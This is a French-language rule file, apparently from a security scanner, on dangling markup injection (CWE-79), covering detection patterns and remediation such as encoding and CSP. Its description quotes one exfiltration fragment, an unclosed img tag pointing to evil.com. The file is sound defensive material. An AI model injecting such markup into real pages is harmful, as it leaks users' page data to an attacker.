---
id: dangling-markup
category: modern
cwe: CWE-79
owasp: A03:2021-Injection
severity_default: medium
languages: [php, js, python, java, csharp, go, rust]
---

# Dangling Markup Injection

## Description
Le Dangling Markup Injection est une technique d'exfiltration de données qui ne nécessite pas d'exécution de JavaScript : l'attaquant injecte une balise HTML non fermée (ex: `<img src="https://evil.com/?`) dans une page, ce qui fait que tout le contenu suivant jusqu'au prochain guillemet/caractère de fermeture est capturé comme valeur d'attribut et envoyé au serveur de l'attaquant lors du chargement de la ressource. Elle est redoutable car elle contourne les protections CSP/XSS classiques qui bloquent uniquement l'exécution de scripts.

## Où ça apparaît typiquement
- Contextes où l'injection HTML est possible mais où une CSP stricte empêche l'exécution de JavaScript.
- Filtrage XSS partiel qui bloque `<script>` mais autorise d'autres balises (`<img>`, `<link>`, `<base>`, `<meta>`) sans validation de fermeture.
- Pages reflétant une entrée utilisateur dans le HTML sans encodage contextuel complet.

## Indicateurs de détection (niveau pattern, pas d'exploitation)
- Sortie HTML construite par concaténation de chaînes incluant une entrée utilisateur sans encodage HTML.
- Liste noire de balises/attributs (bloque `<script>` seulement) au lieu d'un encodage systématique de toute donnée utilisateur insérée dans le HTML.
- Absence de CSP ou CSP ne couvrant pas les vecteurs de requêtes réseau passives (`img-src`, `form-action`).

## Remédiation
- Encoder systématiquement toute donnée utilisateur insérée dans le HTML, quel que soit le contexte de balise.
- Ne pas se reposer sur une liste noire de balises ; utiliser un moteur de template avec échappement automatique par défaut.
- Compléter avec une CSP restrictive incluant `img-src`, `form-action`, `base-uri` pour limiter les destinations d'exfiltration possibles.
- Voir `rules/remediation/dangling-markup.md` pour les diffs par langage.

## Exemple avant/après
Voir `examples/js-node/dangling-markup/` (à créer selon le même schéma pour chaque langage listé ci-dessus).

## Références
- OWASP: XSS (Cross Site Scripting) Prevention Cheat Sheet
- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
